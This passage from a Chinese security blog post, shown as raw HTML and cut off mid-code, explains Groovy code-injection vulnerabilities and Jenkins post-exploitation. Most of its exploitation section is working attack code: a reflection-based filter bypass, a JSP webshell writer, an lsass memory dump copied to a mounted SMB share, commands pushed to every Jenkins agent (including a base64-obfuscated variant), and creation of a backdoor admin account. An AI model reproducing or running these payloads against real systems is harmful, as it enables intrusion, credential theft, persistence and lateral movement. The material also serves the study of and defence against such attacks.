class="headerlink" title="通过IDE运行Groovy脚本"></a>通过IDE运行Groovy脚本</h4><p>有一个叫GroovyShell的类含有main(String[])方法可以运行任何Groovy脚本。</p><p>在前面的IDEA中可以直接运行Groovy脚本：</p><p><img src="/2020/03/24/浅析Groovy代码注入漏洞/4.png" alt=""></p><p>当然，也可以在Java环境中通过groovy-all.jar中的groovy.lang.GroovyShell类来运行Groovy脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp groovy-all-2.4.12.jar groovy.lang.GroovyShell 1.groovy</span><br></pre></td></tr></table></figure><p><img src="/2020/03/24/浅析Groovy代码注入漏洞/5.png" alt=""></p><h4 id="用Groovy创建Unix脚本"><a href="#用Groovy创建Unix脚本" class="headerlink" title="用Groovy创建Unix脚本"></a>用Groovy创建Unix脚本</h4><p>你可以用Groovy编写Unix脚本并且像Unix脚本一样直接从命令行运行它.倘若你安装的是二进制分发包并且设置好环境变量,那么下面的代码将会很好的工作。</p><p>编写一个类似如下的脚本文件，保存为：HelloGroovy</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env groovy</span></span><br><span class="line">println(<span class="string">"this is groovy script"</span>)</span><br><span class="line">println(<span class="string">"Hi,"</span>+args[<span class="number">0</span>]+<span class="string">" welcome to Groovy"</span>)</span><br></pre></td></tr></table></figure><p>然后在命令行下执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x HelloGroovy</span><br><span class="line">$ ./HelloGroovy micmiu.com</span><br><span class="line">this is groovy script</span><br><span class="line">Hi,micmiu.com welcome to Groovy</span><br></pre></td></tr></table></figure><h2 id="0x02-Groovy代码注入漏洞"><a href="#0x02-Groovy代码注入漏洞" class="headerlink" title="0x02 Groovy代码注入漏洞"></a>0x02 Groovy代码注入漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>我们知道，Groovy是一种强大的编程语言，其强大的功能包括了危险的命令执行等调用。</p><p>在目标服务中，如果外部可控输入Groovy代码或者外部可上传一个恶意的Groovy脚本，且程序并未对输入的Groovy代码进行有效的过滤，那么会导致恶意的Groovy代码注入，从而RCE。</p><p>如下代码简单地执行命令：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> &#123;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> main(args)&#123;</span><br><span class="line">        <span class="keyword">def</span> cmd = <span class="string">"calc"</span>;</span><br><span class="line">        println <span class="string">"$&#123;cmd.execute()&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段Groovy代码被执行就会弹计算器：</p><p><img src="/2020/03/24/浅析Groovy代码注入漏洞/6.png" alt=""></p><h3 id="几种PoC变通形式"><a href="#几种PoC变通形式" class="headerlink" title="几种PoC变通形式"></a>几种PoC变通形式</h3><p>Groovy代码注入实现命令执行有以下几种变通的形式：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接命令执行</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"calc"</span>)</span><br><span class="line"><span class="string">"calc"</span>.execute()</span><br><span class="line"><span class="string">'calc'</span>.execute()</span><br><span class="line"><span class="string">"$&#123;"</span>calc<span class="string">".execute()&#125;"</span></span><br><span class="line"><span class="string">"$&#123;'calc'.execute()&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回显型命令执行</span></span><br><span class="line">println <span class="string">"whoami"</span>.execute().text</span><br><span class="line">println <span class="string">'whoami'</span>.execute().text</span><br><span class="line">println <span class="string">"$&#123;"</span>whoami<span class="string">".execute().text&#125;"</span></span><br><span class="line">println <span class="string">"$&#123;'whoami'.execute().text&#125;"</span></span><br><span class="line"><span class="keyword">def</span> cmd = <span class="string">"whoami"</span>;</span><br><span class="line">println <span class="string">"$&#123;cmd.execute().text&#125;"</span>;</span><br></pre></td></tr></table></figure><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p>在下面一些场景中，会触发Groovy代码注入漏洞。</p><h4 id="GroovyShell"><a href="#GroovyShell" class="headerlink" title="GroovyShell"></a>GroovyShell</h4><p>GroovyShell允许在Java类中（甚至Groovy类）解析任意Groovy表达式的值。</p><p>GroovyShellExample.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.GroovyShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyShellExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> </span>&#123;</span><br><span class="line">        GroovyShell groovyShell = <span class="keyword">new</span> GroovyShell();</span><br><span class="line">        groovyShell.evaluate(<span class="string">"\"calc\".execute()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接运行即可弹计算器：</p><p><img src="/2020/03/24/浅析Groovy代码注入漏洞/7.png" alt=""></p><p>或者换成运行Groovy脚本的方式也是也一样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.GroovyShell;</span><br><span class="line"><span class="keyword">import</span> groovy.lang.Script;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyShellExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GroovyShell groovyShell = <span class="keyword">new</span> GroovyShell();</span><br><span class="line">        Script script = groovyShell.parse(<span class="keyword">new</span> File(<span class="string">"src/test.groovy"</span>));</span><br><span class="line">        script.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.groovy：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println <span class="string">"whoami"</span>.execute().text</span><br></pre></td></tr></table></figure><p>此外，可使用Binding对象输入参数给表达式，并最终通过GroovyShell返回Groovy表达式的计算结果。</p><h4 id="GroovyScriptEngine"><a href="#GroovyScriptEngine" class="headerlink" title="GroovyScriptEngine"></a>GroovyScriptEngine</h4><p>GroovyScriptEngine可从指定的位置（文件系统、URL、数据库等等）加载Groovy脚本，并且随着脚本变化而重新加载它们。如同GroovyShell一样，GroovyScriptEngine也允许传入参数值，并能返回脚本的计算值。</p><p>GroovyScriptEngineExample.java，直接运行即加载Groovy脚本文件实现命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.Binding;</span><br><span class="line"><span class="keyword">import</span> groovy.util.GroovyScriptEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyScriptEngineExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GroovyScriptEngine groovyScriptEngine = <span class="keyword">new</span> GroovyScriptEngine(<span class="string">""</span>);</span><br><span class="line">        groovyScriptEngine.run(<span class="string">"src/test.groovy"</span>,<span class="keyword">new</span> Binding());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.groovy脚本文件如之前。</p><h4 id="GroovyClassLoader"><a href="#GroovyClassLoader" class="headerlink" title="GroovyClassLoader"></a>GroovyClassLoader</h4><p>GroovyClassLoader是一个定制的类装载器，负责解释加载Java类中用到的Groovy类。</p><p>GroovyClassLoaderExample.java，直接运行即加载Groovy脚本文件实现命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.GroovyClassLoader;</span><br><span class="line"><span class="keyword">import</span> groovy.lang.GroovyObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyClassLoaderExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GroovyClassLoader groovyClassLoader = <span class="keyword">new</span> GroovyClassLoader();</span><br><span class="line">        Class loadClass = groovyClassLoader.parseClass(<span class="keyword">new</span> File(<span class="string">"src/test.groovy"</span>));</span><br><span class="line">        GroovyObject groovyObject = (GroovyObject) loadClass.newInstance();</span><br><span class="line">        groovyObject.invokeMethod(<span class="string">"main"</span>,<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.groovy脚本文件如之前。</p><h4 id="ScriptEngine"><a href="#ScriptEngine" class="headerlink" title="ScriptEngine"></a>ScriptEngine</h4><p>ScriptEngine脚本引擎是被设计为用于数据交换和脚本执行的。</p><ul><li>数据交换：表现在调度引擎的时候，允许将数据输入/输出引擎，至于引擎内的数据持有的具体方式有两种：普通的键值对和Bindings（interface Bindings extends Map&lt;String,Object&gt;）；</li><li>脚本执行：脚本引擎执行表现为调用eval()；</li></ul><p>ScriptEngineManager类是一个脚本引擎的管理类，用来创建脚本引擎，大概的方式就是在类加载的时候通过SPI的方式，扫描ClassPath中已经包含实现的所有ScriptEngineFactory，载入后用来负责生成具体的ScriptEngine。</p><p>在ScriptEngine中，支持名为“groovy”的引擎，可用来执行Groovy代码。这点和在SpEL表达式注入漏洞中讲到的同样是利用ScriptEngine支持JS引擎从而实现绕过达到RCE是一样的。</p><p>ScriptEngineExample.java，直接运行即命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScriptEngineExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ScriptEngine groovyEngine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">"groovy"</span>);</span><br><span class="line">        groovyEngine.eval(<span class="string">"\"calc\".execute()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行Groovy脚本，需要实现读取文件内容的接口而不能直接传入File类对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScriptEngineExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ScriptEngine groovyEngine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">"groovy"</span>);</span><br><span class="line">        String code = readfile(<span class="string">"src/test.groovy"</span>);</span><br><span class="line">        groovyEngine.eval(code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readfile</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(filename));</span><br><span class="line">        String string = <span class="string">""</span>;</span><br><span class="line">        String str;</span><br><span class="line">        <span class="keyword">while</span> ((str = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            string = string + str;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.groovy脚本文件如之前。</p><h4 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h4><p>Groovy语言包含了一个模板引擎功能，可以生成各种类型的格式化文件，非常方便。模板引擎有下面几个，它们<br>都实现了Template接口。</p><ul><li>SimpleTemplateEngine：基本的模板</li><li>StreamingTemplateEngine：功能和 SimpleTemplateEngine相同，不过支持大于64k的模板</li><li>GStringTemplateEngine：将模板保存为可写的闭包，在流式场景中很有用</li><li>XmlTemplateEngine：输出XML文件的模板引擎</li><li>MarkupTemplateEngine：一个完整的、优化过的模板引擎，可以用于生成HTML等模板</li></ul><p>场景：</p><ul><li>整个模板可控</li><li>模板使用拼接的方式生成，内容部分可控</li></ul><h2 id="0x03-漏洞利用Tricks"><a href="#0x03-漏洞利用Tricks" class="headerlink" title="0x03 漏洞利用Tricks"></a>0x03 漏洞利用Tricks</h2><h3 id="利用反射机制和字符串拼接Bypass"><a href="#利用反射机制和字符串拼接Bypass" class="headerlink" title="利用反射机制和字符串拼接Bypass"></a>利用反射机制和字符串拼接Bypass</h3><p>直接的命令执行在前面已经说过几种形式了：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接命令执行</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"calc"</span>)</span><br><span class="line"><span class="string">"calc"</span>.execute()</span><br><span class="line"><span class="string">'calc'</span>.execute()</span><br><span class="line"><span class="string">"$&#123;"</span>calc<span class="string">".execute()&#125;"</span></span><br><span class="line"><span class="string">"$&#123;'calc'.execute()&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回显型命令执行</span></span><br><span class="line">println <span class="string">"whoami"</span>.execute().text</span><br><span class="line">println <span class="string">'whoami'</span>.execute().text</span><br><span class="line">println <span class="string">"$&#123;"</span>whoami<span class="string">".execute().text&#125;"</span></span><br><span class="line">println <span class="string">"$&#123;'whoami'.execute().text&#125;"</span></span><br><span class="line"><span class="keyword">def</span> cmd = <span class="string">"whoami"</span>;</span><br><span class="line">println <span class="string">"$&#123;cmd.execute().text&#125;"</span>;</span><br></pre></td></tr></table></figure><p>在某些场景下，程序可能会过滤输入内容，此时可以通过反射机制以及字符串拼接的方式来绕过实现命令执行：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line">Class&lt;?&gt; rt = Class.forName("java.la" + "ng.Run" + "time");</span><br><span class="line">Method gr = rt.getMethod("getR" + "untime");</span><br><span class="line">Method ex = rt.getMethod("ex" + "ec", String.class);</span><br><span class="line">ex.invoke(gr.invoke(null), "ca" + "lc")</span><br></pre></td></tr></table></figure><h3 id="窃取环境变量信息"><a href="#窃取环境变量信息" class="headerlink" title="窃取环境变量信息"></a>窃取环境变量信息</h3><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> env = System.getenv()</span><br><span class="line">println <span class="string">"$&#123;env&#125;"</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/24/浅析Groovy代码注入漏洞/8.png" alt=""></p><h3 id="枚举文件和文件夹"><a href="#枚举文件和文件夹" class="headerlink" title="枚举文件和文件夹"></a>枚举文件和文件夹</h3><p>枚举指定目录下的文件及文件夹：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir = <span class="keyword">new</span> File(<span class="string">"E:\\wamp64\\www"</span>)</span><br><span class="line">dir.eachFile &#123;</span><br><span class="line">    println it</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/24/浅析Groovy代码注入漏洞/9.png" alt=""></p><p>枚举Windows下所有用户：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir = <span class="keyword">new</span> File(<span class="string">"C:\\users"</span>)</span><br><span class="line">dir.eachFile &#123;</span><br><span class="line">    println it</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="操作文件"><a href="#操作文件" class="headerlink" title="操作文件"></a>操作文件</h3><p><strong>删除文件：</strong></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deleteme = <span class="keyword">new</span> File(<span class="string">'C:\\Users\\1.txt'</span>)</span><br><span class="line">deleteme.delete()</span><br></pre></td></tr></table></figure><p><strong>新建文件：</strong></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">createme = <span class="keyword">new</span> File(<span class="string">'E:\\wamp64\\www\\webshell.jsp'</span>)</span><br><span class="line">createme.createNewFile()</span><br></pre></td></tr></table></figure><p>创建一个空文件好像没啥用，但是可在渗透测试中用于检查用户在Jenkins的Web根目录下是否有可写的权限。</p><p><strong>读取文件：</strong></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String fileContents = <span class="keyword">new</span> File(<span class="string">'E:\\wamp64\\www\\flag.txt'</span>).text</span><br><span class="line">println(fileContents)</span><br></pre></td></tr></table></figure><p><strong>复制和移动文件：</strong></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">File src = <span class="keyword">new</span> File(<span class="string">"E:\\passwd"</span>)</span><br><span class="line">File dest = <span class="keyword">new</span> File(<span class="string">"E:\\passwd.txt"</span>)</span><br><span class="line">dest &lt;&lt; src.bytes</span><br></pre></td></tr></table></figure><p><strong>写入文件：</strong></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> File(<span class="string">'E:\\wamp64\\www'</span>,<span class="string">'webshell.jsp'</span>).withWriter(<span class="string">'utf-8'</span>) &#123;</span><br><span class="line">    writer -&gt;writer.writeLine <span class="string">'&lt;%Runtime.getRuntime().exec(request.getParameter("i"));%&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="加载共享盘"><a href="#加载共享盘" class="headerlink" title="加载共享盘"></a>加载共享盘</h3><blockquote><p>在一个攻陷主机加载一个远程共享盘可能没什么大问题，但是看一下做这件事的动机就知道这很重要。</p><p>我们来假设通过bat脚本从文件系统下载资源：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net use P: \\192.168.1.42\ShareName /user:MACHINE\user MountPassword</span><br><span class="line">cd &quot;C:\stack&quot;</span><br><span class="line">set HOME=%USERPROFILE%</span><br><span class="line">echo %date% %time%</span><br><span class="line">&quot;P:\Internal_Tools\Portable Software Stack\Git\bin\git.exe&quot; clean –f</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><blockquote><p>这种情况下192.168.1.42是一个和受攻击的Groovy主机同一个子网下的共享服务器，bat脚本中发现用了SMB共享的凭据信息，也就是说可以在Groovy脚本中运行“net use P:\192.168.1.43\Sharename /user:MACHINE\user MountPassword”这个命令，攻击者可以加载网络文件夹到本地磁盘下。</p><p>希望如果这样获得的凭据提供对远程共享中的一个或多个子文件夹的写访问权限，则攻击者可以将该共享用作临时服务器，其中存储命令输出或后门以从受感染的主机运行。 这将使攻击者处于更好的状态，在不触发防御警告的情况下传输自己想要用的工具。</p></blockquote><h3 id="执行procdump"><a href="#执行procdump" class="headerlink" title="执行procdump"></a>执行procdump</h3><blockquote><p>Windows下一个特殊的场景包括了执行procdump工具来下载“lsass.exe”进程的内存记录以拿到NTML哈希或明文密码。</p><p>这个操作可以通过如下一行代码执行：</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println <span class="string">"C:\\users\\username\\jenkins-monitor.exe -accepteula -64 -ma lsass.exe C:\\users\\username\\lsass.dmp"</span>.execute().text</span><br></pre></td></tr></table></figure><blockquote><p>procdump二进制文件以”C:\users\username\jenkins-monitor.exe”的文件名来执行，输出保存在文件“C:\users\username\lsass.dmp”中。</p><p>现在“lsass.dmp”可以从jenkins本地通过Groovy代码传到共享盘了：</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">src = <span class="keyword">new</span> File(<span class="string">"C:\\users\\username\\lsass.dmp"</span>)</span><br><span class="line">dist = <span class="keyword">new</span> File(<span class="string">"P:\\tmp\\lsass.dmp"</span>)</span><br><span class="line">dist &lt;&lt; src.bytes</span><br></pre></td></tr></table></figure><blockquote><p>然后攻击者可以分析它以拿到hash和凭据来在目标网络内做更多的控制操作。</p></blockquote><h3 id="散布（spray）技术"><a href="#散布（spray）技术" class="headerlink" title="散布（spray）技术"></a>散布（spray）技术</h3><blockquote><p>当一个Jenkins主节点被攻陷，所有连接它的从节点就会因为如下代码（使用了RemoteDiagnostics）就会被强制执行命令：</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hudson.util.RemotingDiagnostics;</span><br><span class="line"><span class="keyword">def</span> jenkins = Jenkins.instance</span><br><span class="line"><span class="keyword">def</span> computers = jenkins.computers</span><br><span class="line">command = <span class="string">'println "whoami".execute().text'</span></span><br><span class="line">computers.each&#123;</span><br><span class="line"> <span class="keyword">if</span> (it.hostName)&#123;</span><br><span class="line"> println RemotingDiagnostics.executeGroovy(command,</span><br><span class="line">it.getChannel());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在这个案例中“whoami”命令会在网络中连接的Jenkins代理中被大量执行。</p></blockquote><h3 id="基于Base64编码的散布技术"><a href="#基于Base64编码的散布技术" class="headerlink" title="基于Base64编码的散布技术"></a>基于Base64编码的散布技术</h3><blockquote><p>更有趣的是，Groovy脚本可以不止发送单行代码给从服务器进行执行。为了不被发现，脚本编码了Groovy代码然后发送给了从服务器进行执行：</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hudson.util.RemotingDiagnostics;</span><br><span class="line"><span class="keyword">def</span> jenkins = Jenkins.instance</span><br><span class="line"><span class="keyword">def</span> computers = jenkins.computers</span><br><span class="line"><span class="keyword">def</span> command =</span><br><span class="line"><span class="string">'ZGlyID0gbmV3IEZpbGUoJ2M6XFwnKQpkaXIuZWFjaEZpbGUgewoJcHJpbnRsbiBpdAp9</span></span><br><span class="line"><span class="string">Cg=='</span></span><br><span class="line"><span class="keyword">byte</span>[] decoded = command.decodeBase64()</span><br><span class="line">payload = <span class="keyword">new</span> String(decoded)</span><br><span class="line">computers.each&#123;</span><br><span class="line"> <span class="keyword">if</span> (it.hostName)&#123;</span><br><span class="line">println RemotingDiagnostics.executeGroovy(payload,</span><br><span class="line">it.getChannel());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>上面的代码中““ZGlyID0gbmV3IEZpbGUoJ2M6XFwnKQpkaXIuZWFjaEZpbGUgewoJcHJpbnRsbiBpdAp9Cg==”经过base64解码后就是在从服务器的C:\中列文件和文件夹的代码命令：</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir = <span class="keyword">new</span> File(<span class="string">'c:\\'</span>)</span><br><span class="line">dir.eachFile &#123;</span><br><span class="line">println it</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里关键的就是Groovy脚本可以嵌套另一个进行base64编码后的Groovy脚本。这是复制并粘贴到Jenkins Groovy控制台中的主要脚本。</p><p>散布技术是很有帮助的，例如一个攻击者想要一个一次性后门（所有从主机都可以被主服务器上的后门控制）。</p></blockquote><h3 id="建立账号后门"><a href="#建立账号后门" class="headerlink" title="建立账号后门"></a>建立账号后门</h3><blockquote><p>当访问Groovydeconsole口因为未授权原因被拒绝的话，如下脚本可以允许一个恶意代理创建账号，只要将如下代码中的“USERNAME”和”PASSWORD”字符串为自己的字符就可以了。</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jenkins.model.*</span><br><span class="line"><span class="keyword">import</span> hudson.security.*</span><br><span class="line"><span class="keyword">def</span> instance = Jenkins.getInstance()</span><br><span class="line"><span class="keyword">def</span> hudsonRealm = <span class="keyword">new</span> HudsonPrivateSecurityRealm(<span class="literal">false</span>)</span><br><span class="line">hudsonRealm.createAccount(<span class="string">"USERNAME"</span>,<span class="string">"PASSWORD"</span>)</span><br><span 